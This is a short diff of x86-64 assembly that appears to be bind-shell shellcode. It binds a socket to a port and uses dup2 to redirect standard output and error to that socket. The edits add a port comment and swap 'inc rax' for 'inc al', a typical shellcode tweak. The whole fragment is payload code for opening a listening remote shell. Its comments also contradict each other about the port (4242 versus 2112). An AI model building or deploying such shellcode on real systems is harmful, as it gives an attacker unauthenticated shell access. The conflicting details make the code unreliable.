@@ -23,7 +23,7 @@ _start:
 	;; bind(sock, {AF_INET, htons(4242), 0, 0}, 16)
 	mov rdi, rax			;; rdi = sock
 	push QWORD rdx			;; rdx == 0 (sin_zero)
-	push 0x4008ff02
+	push 0x4008ff02			;; 0x4008 = 2112 (sin_port), 02 = AF_INET
 	mov [rsp + 1], dl
 	mov rsi, rsp
 	mov dl, 16			;; rdx = 16 (sizeof(struct sockaddr_in))
@@ -52,14 +52,14 @@ _start:
 	syscall
 
 	;; dup2(sock, 1)
-	inc rax
+	inc al
 	mov rsi, rax
 	xor rax, rax
 	mov al, 33			;; rax = 33 (dup2)
 	syscall
 
 	;; dup2(sock, 2)
-	inc rax
+	inc al
 	mov rsi, rax
 	xor rax, rax
 	mov al, 33			;; rax = 33 (dup2)
